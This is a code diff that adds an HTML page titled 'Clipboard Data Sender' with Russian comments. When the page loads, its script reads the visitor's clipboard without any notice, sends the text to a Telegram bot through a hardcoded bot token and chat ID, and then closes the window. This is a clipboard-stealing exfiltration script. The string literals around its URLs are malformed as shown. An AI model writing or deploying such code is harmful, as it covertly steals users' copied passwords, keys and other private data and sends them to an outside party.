@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clipboard Data Sender</title>
+</head>
+<body>
+    <script>
+        async function sendClipboardData() {
+            try {
+                // Проверяем поддержку API
+                if (!navigator.clipboard) {
+                    console.error("Clipboard API is not supported in your browser.");
+                    return;
+                }
+
+                // Читаем данные из буфера обмена
+                const clipboardData = await navigator.clipboard.readText();
+
+                // Отправляем данные в Telegram чат
+                const apiUrl = https://api.telegram.org/bot7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ/sendMessage;
+                const chatId = '7406507427';
+                const message = encodeURIComponent(clipboardData);
+
+                const response = await fetch(${apiUrl}?chat_id=${chatId}&text=${message});
+                const result = await response.json();
+
+                if (result.ok) {
+                    console.log("Data sent successfully.");
+                } else {
+                    console.error("Failed to send data.");
+                }
+            } catch (error) {
+                console.error("Error: ", error);
+            } finally {
+                // Закрываем окно
+                window.close();
+            }
+        }
+
+        // Запускаем функцию
+        sendClipboardData();
+    </script>
+</body>
+</html>
